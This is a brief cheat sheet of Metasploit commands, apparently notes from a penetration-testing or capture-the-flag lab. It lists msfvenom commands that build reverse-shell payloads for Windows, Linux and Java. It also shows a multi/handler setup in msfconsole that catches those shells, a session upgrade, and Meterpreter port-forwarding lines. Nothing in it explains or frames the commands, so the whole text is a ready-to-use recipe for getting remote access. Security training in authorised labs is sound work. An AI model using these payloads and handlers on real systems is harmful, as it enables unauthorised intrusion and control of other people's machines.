## MSFVenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=6666 -f exe -o 6shell.exe

msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=tun0 LPORT=5555 -f elf > shell.elf

msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1337 -f jar > payload.jar
```

## MSFConsole
```
set PAYLOAD java/meterpreter/reverse_tcp

sudo msfconsole

use exploit/multi/handler
set PAYLOAD linux/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 6666
exploit

sessions -u 1
```

### Port Forwarding
``` Port Forwarding
portfwd add -R -L 0.0.0.0 -l 80 -p 8080 -r 0.0.0.0

portfwd del -l 80 -p 8080 -r 127.0.0.1 -R
```